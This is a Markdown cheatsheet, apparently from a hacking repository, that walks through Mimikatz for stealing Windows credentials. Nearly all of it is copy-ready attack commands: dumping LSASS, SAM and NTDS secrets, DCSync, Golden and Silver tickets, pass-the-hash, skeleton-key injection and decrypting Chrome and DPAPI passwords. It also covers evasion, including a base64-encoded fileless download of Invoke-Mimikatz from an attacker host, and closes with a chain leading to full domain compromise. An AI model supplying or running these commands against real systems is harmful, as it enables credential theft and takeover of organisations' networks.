# 🔑 Mimikatz - Complete Cheatsheet

```
  ███╗   ███╗██╗███╗   ███╗██╗██╗  ██╗ █████╗ ████████╗███████╗
  ████╗ ████║██║████╗ ████║██║██║ ██╔╝██╔══██╗╚══██╔══╝╚══════╝
  ██╔████╔██║██║██╔████╔██║██║█████╔╝ ███████║   ██║   ███████╗
  ██║╚██╔╝██║██║██║╚██╔╝██║██║██╔═██╗ ██╔══██║   ██║   ╚════██║
  ██║ ╚═╝ ██║██║██║ ╚═╝ ██║██║██║  ██╗██║  ██║   ██║   ███████║
  ╚═╝     ╚═╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
               Windows Credential Extraction Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/Mimikatz-Post_Exploitation-red?style=for-the-badge" alt="Mimikatz">
  <img src="https://img.shields.io/badge/Windows-Credentials-blue?style=for-the-badge" alt="Credentials">
  <img src="https://img.shields.io/badge/Active_Directory-orange?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

<p align="center">
  <b>🔓 The most powerful Windows credential extraction tool</b>
</p>

---

## 📋 Table of Contents

- [What is Mimikatz](#-what-is-mimikatz)
- [Getting Started](#-getting-started)
- [Execution Methods](#-execution-methods)
- [Core Modules](#-core-modules)
- [Credential Extraction](#-credential-extraction)
- [Kerberos Attacks](#-kerberos-attacks)
- [Advanced Attacks](#-advanced-attacks)
- [Evasion Techniques](#-evasion-techniques)
- [Quick Reference](#-quick-reference)

---

## 🎯 What is Mimikatz

**Mimikatz** is a post-exploitation tool created by **Benjamin Delpy** (@gentilkiwi) that allows extraction of:

- 🔑 **Plaintext passwords** from Windows memory (LSASS)
- 🎫 **Kerberos tickets** (TGT, TGS)
- 🔐 **NTLM hashes** from SAM/NTDS
- 📜 **Certificates** and private keys
- 🗝️ **Cached credentials**
- 🔒 **DPAPI secrets**

### Why is it Important?

| Use Case | Description |
|----------|-------------|
| **Credential Theft** | Extract passwords from memory |
| **Lateral Movement** | Pass-the-Hash, Pass-the-Ticket |
| **Privilege Escalation** | Impersonate users |
| **Persistence** | Golden/Silver Tickets |
| **Domain Dominance** | DCSync for full AD compromise |

---

## 🚀 Getting Started

### Download

```bash
# Official repository
git clone https://github.com/gentilkiwi/mimikatz.git

# Pre-compiled binaries (releases)
# https://github.com/gentilkiwi/mimikatz/releases
```

### Requirements

- **Administrator/SYSTEM** privileges (most functions)
- **SeDebugPrivilege** (for LSASS access)
- Windows x64 or x86

### First Commands

```cmd
# Launch mimikatz
mimikatz.exe

# Check privileges
mimikatz # privilege::debug
Privilege '20' OK

# Enable all privileges
mimikatz # token::elevate

# Exit
mimikatz # exit
```

---

## 💻 Execution Methods

### 1. Standalone Binary

```cmd
# Direct execution (detected by AV)
mimikatz.exe

# One-liner
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Log output to file
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > output.txt

# With log command
mimikatz.exe "log output.log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### 2. PowerShell (Invoke-Mimikatz)

```powershell
# Download and execute in memory (fileless)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Dump credentials
Invoke-Mimikatz -DumpCreds

# Dump certs
Invoke-Mimikatz -DumpCerts

# Execute on remote machine
Invoke-Mimikatz -ComputerName DC01
```

### 3. Metasploit (Kiwi)

```bash
# In meterpreter session
meterpreter > load kiwi

# Get help
meterpreter > help kiwi

# Dump all credentials
meterpreter > creds_all

# Dump hashes
meterpreter > lsa_dump_sam

# Dump secrets
meterpreter > lsa_dump_secrets

# Kerberos tickets
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use /path/to/ticket.kirbi
```

### 4. CrackMapExec

```bash
# Dump SAM
crackmapexec smb 192.168.1.0/24 -u admin -p password --sam

# Dump LSA
crackmapexec smb 192.168.1.0/24 -u admin -p password --lsa

# Dump NTDS
crackmapexec smb dc01.domain.local -u admin -p password --ntds
```

### 5. From Memory Dump

```cmd
# Dump LSASS with Task Manager or procdump
procdump.exe -ma lsass.exe lsass.dmp

# Load dump in mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## 🔧 Core Modules

### Module Overview

| Module | Description |
|--------|-------------|
| **sekurlsa** | Extract credentials from LSASS memory |
| **lsadump** | Dump SAM, NTDS, secrets, cache |
| **kerberos** | Kerberos tickets manipulation |
| **crypto** | CryptoAPI certificates |
| **vault** | Windows Vault (credentials manager) |
| **token** | Token manipulation |
| **privilege** | Privilege manipulation |
| **process** | Process manipulation |
| **service** | Service manipulation |
| **dpapi** | DPAPI secrets |
| **misc** | Miscellaneous commands |

### Getting Help

```cmd
# List all modules
mimikatz # ::

# Module help
mimikatz # sekurlsa::
mimikatz # lsadump::
mimikatz # kerberos::
```

---

## 🔐 Credential Extraction

### sekurlsa Module (LSASS)

```cmd
# Enable debug privilege first!
mimikatz # privilege::debug

# Dump all logon passwords (plaintext, NTLM, SHA1)
mimikatz # sekurlsa::logonpasswords

# Dump only NTLM hashes
mimikatz # sekurlsa::msv

# Dump Kerberos tickets
mimikatz # sekurlsa::tickets

# Dump WDigest credentials (plaintext if enabled)
mimikatz # sekurlsa::wdigest

# Dump Kerberos encryption keys
mimikatz # sekurlsa::ekeys

# Dump DPAPI credentials
mimikatz # sekurlsa::dpapi

# Dump credentials of specific process
mimikatz # sekurlsa::logonpasswords /process:lsass.exe

# Dump TsPkg credentials (RDP)
mimikatz # sekurlsa::tspkg

# Dump LiveSSP credentials
mimikatz # sekurlsa::livessp

# Dump SSP credentials
mimikatz # sekurlsa::ssp

# Dump CloudAP credentials (Azure AD)
mimikatz # sekurlsa::cloudap
```

### lsadump Module (SAM/NTDS)

```cmd
# Dump SAM database (local accounts)
mimikatz # lsadump::sam

# Dump SAM with SYSTEM hive
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM

# Dump LSA secrets
mimikatz # lsadump::secrets

# Dump cached credentials (DCC2)
mimikatz # lsadump::cache

# DCSync (Domain Controller replication)
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Dump NTDS.dit (Domain Controller)
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::lsa /inject

# Dump trust keys
mimikatz # lsadump::trust /patch

# Dump backup keys (DPAPI)
mimikatz # lsadump::backupkeys /system:dc01.domain.local /export
```

### vault Module (Credential Manager)

```cmd
# List vault credentials
mimikatz # vault::list

# Dump vault credentials
mimikatz # vault::cred /patch
```

### dpapi Module

```cmd
# Dump DPAPI masterkeys
mimikatz # dpapi::masterkey /in:masterkey_file /sid:user_sid /password:password

# Decrypt DPAPI blob
mimikatz # dpapi::blob /in:blob_file /masterkey:key

# Chrome passwords
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---

## 🎫 Kerberos Attacks

### View Tickets

```cmd
# List all tickets
mimikatz # kerberos::list

# List tickets with details
mimikatz # kerberos::list /export

# Export all tickets
mimikatz # sekurlsa::tickets /export
```

### Pass-the-Ticket (PtT)

```cmd
# Clear existing tickets
mimikatz # kerberos::purge

# Import ticket
mimikatz # kerberos::ptt ticket.kirbi

# Verify ticket
mimikatz # kerberos::list
```

### Golden Ticket (Domain Admin Persistence)

```cmd
# Requirements:
# - Domain name (domain.local)
# - Domain SID (S-1-5-21-...)
# - krbtgt NTLM hash
# - Target username (can be fake)

# Create Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:ntlm_hash /ptt

# Create and export
mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ticket:golden.kirbi

# With specific groups (RID 500 = Admin, 512 = Domain Admins, etc.)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /groups:500,501,513,512,520,518,519 /ptt

# With target DC
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /sids:S-1-5-21-xxx-519 /ptt
```

### Silver Ticket (Service-specific)

```cmd
# Requirements:
# - Domain name
# - Domain SID
# - Target service account NTLM hash
# - Service SPN

# Create Silver Ticket for CIFS (file shares)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:service_hash /ptt

# Silver Ticket for HTTP (web)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:web.domain.local /service:http /rc4:hash /ptt

# Silver Ticket for SQL
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:sql.domain.local /service:MSSQLSvc /rc4:hash /ptt

# Silver Ticket for WinRM/PSRemoting
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:http /rc4:hash /ptt
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:wsman /rc4:hash /ptt
```

---

## 💀 Advanced Attacks

### Pass-the-Hash (PtH)

```cmd
# Run command as user with NTLM hash
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# With AES keys
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /aes256:aes_key /run:powershell.exe

# PtH to spawn process
mimikatz # sekurlsa::pth /user:admin /domain:. /ntlm:hash /run:"powershell -ep bypass"
```

### Overpass-the-Hash (Pass-the-Key)

```cmd
# Convert NTLM to Kerberos ticket
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# Then request TGT
# klist should show Kerberos ticket
```

### DCSync Attack

```cmd
# Replicate single user
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# Replicate krbtgt (for Golden Ticket)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Replicate all users
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Replicate specific DC
mimikatz # lsadump::dcsync /domain:domain.local /dc:DC01.domain.local /user:Administrator
```

### Skeleton Key

```cmd
# Inject skeleton key into DC LSASS (all users can auth with "mimikatz")
mimikatz # misc::skeleton

# Persistence until DC reboot
# Login with any user: password = mimikatz
```

### DPAPI Abuse

```cmd
# Dump masterkeys
mimikatz # sekurlsa::dpapi

# Decrypt credential file
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\xxx /masterkey:key

# RDP saved passwords
mimikatz # dpapi::rdg /in:rdp_file.rdg /masterkey:key
```

### Token Manipulation

```cmd
# List tokens
mimikatz # token::list

# Elevate to SYSTEM
mimikatz # token::elevate

# Elevate to specific user
mimikatz # token::elevate /user:Administrator

# Revert to original token
mimikatz # token::revert

# Run as specific user
mimikatz # token::run /user:domain\admin
```

---

## 🛡️ Evasion Techniques

### Obfuscated Names

```cmd
# Rename mimikatz.exe
rename mimikatz.exe m.exe
rename mimikatz.exe totally_legit.exe
```

### PowerShell Obfuscation

```powershell
# Base64 encode
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded
```

### Memory-Only Execution

```powershell
# Invoke-Mimikatz (fileless)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz

# Or use meterpreter kiwi
meterpreter > load kiwi
meterpreter > creds_all
```

### LSASS Dump Alternatives

```cmd
# Procdump (signed by Microsoft)
procdump.exe -ma lsass.exe lsass.dmp

# comsvcs.dll (built-in)
rundll32.exe comsvcs.dll, MiniDump <lsass_pid> dump.dmp full

# Task Manager (GUI)
# Right-click lsass.exe > Create dump file

# SQLDumper (from SQL Server)
sqldumper.exe <lsass_pid> 0 0x01100
```

### Credential Guard Bypass

```cmd
# Check if Credential Guard is enabled
mimikatz # sekurlsa::logonpasswords
# Will show "ERROR kuhl_m_sekurlsa_acquireLSA"

# Alternative: Use DCSync instead
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

---

## 📊 Quick Reference

### Essential One-Liners

```cmd
# Dump all creds
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Dump SAM
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# DCSync all
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all /csv" "exit"

# Golden Ticket
mimikatz.exe "privilege::debug" "kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ptt" "exit"

# Pass-the-Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd.exe" "exit"
```

### Module Quick Reference

| Command | Description |
|---------|-------------|
| `privilege::debug` | Enable debug privilege |
| `token::elevate` | Elevate to SYSTEM |
| `sekurlsa::logonpasswords` | Dump all creds from LSASS |
| `sekurlsa::msv` | Dump NTLM hashes |
| `sekurlsa::tickets` | Dump Kerberos tickets |
| `sekurlsa::pth` | Pass-the-Hash |
| `lsadump::sam` | Dump SAM database |
| `lsadump::secrets` | Dump LSA secrets |
| `lsadump::dcsync` | DCSync attack |
| `lsadump::lsa /patch` | Dump NTDS from DC |
| `kerberos::list` | List Kerberos tickets |
| `kerberos::ptt` | Pass-the-Ticket |
| `kerberos::golden` | Create Golden/Silver Ticket |
| `kerberos::purge` | Clear tickets |
| `vault::list` | List vault creds |
| `dpapi::cred` | Decrypt DPAPI creds |

### Attack Chain Example

```
1. Get initial access
2. privilege::debug
3. sekurlsa::logonpasswords (get creds)
4. sekurlsa::pth (lateral movement)
5. lsadump::dcsync /user:krbtgt (get krbtgt hash)
6. kerberos::golden (create Golden Ticket)
7. Full domain compromise!
```

---

## 📚 Resources

- [Official GitHub](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [ADSecurity Mimikatz Guide](https://adsecurity.org/?page_id=1821)
- [HackTricks Mimikatz](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)

### Related Cheatsheets
- [Windows PrivEsc](../Windows-PrivEsc/README.md)
- [Metasploit](../Metasploit/README.md)
- [Meterpreter](../Metasploit/Meterpreter.md)

---

<p align="center">
  <b>🔑 Master Windows Credential Attacks!</b><br>
  <i>Mimikatz - The hacker's Swiss Army knife for Windows</i>
</p>
